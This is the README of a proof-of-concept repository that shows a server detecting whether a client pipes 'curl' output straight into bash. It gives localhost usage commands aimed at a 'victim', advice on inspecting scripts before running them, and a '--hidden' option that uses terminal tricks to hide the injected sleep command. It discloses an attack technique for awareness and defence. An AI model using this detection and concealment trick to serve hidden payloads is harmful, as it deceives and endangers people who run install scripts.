# curlbash_detect
This repository contains a proof of concept showing that it is possible to "passively" detect
whether a client is running a simple `curl <url>`, or directly pipes the output to bash with `curl <url> | bash`.

# Usage
Run the server:
`python3 main.py [--host] [--port]`

From the victim, without pipe to bash:
`curl -o- localhost:8000`

From the victim, with pipe to bash:
`curl -o- localhost:8000 | bash` 

> **_NOTE_** not using `-o-` may trigger warnings and reset the connection.

# How it works



# How to be safe
The way to bypass this kind of detection is to prevent bash from executing anything before the response is finished.
The bad way to do this is to place some kind of buffer between curl and bash, like this:
```
curl -s -o- localhost:8000 | sponge | bash
```
`sponge` will first soak up all of the input, before it opens up the output file.

The better, and safe way to do this, is by not piping to bash **at all**. 
Instead, you should redirect the output of curl to a file, inspect that file, and then, when deemed safe, execute that file.
```
curl -s localhost:8000 > file.sh
more file.sh
./file.sh
```
This way you can see that the file looks pretty weird...
```
$ ls -alh
-rw-r--r--  1 ##### ##### 5.4M May 24 21:17 file.sh
```
A file size of 5.4M, yet it is almost completely empty (except for all those invisible-null bytes)
 
# Extra's 
Altough a `sleep X` showing in stdout is quite inconspicuous, it may still grab your attention. Therefore,
an additional option was included for the server: `--hidden`. Using this option,
the response of the server will contain some terminal magic to hide the sleep command.
This way, the response will look less suspicious.

# Credits
https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/ (unreachable as of 24/05/2023)
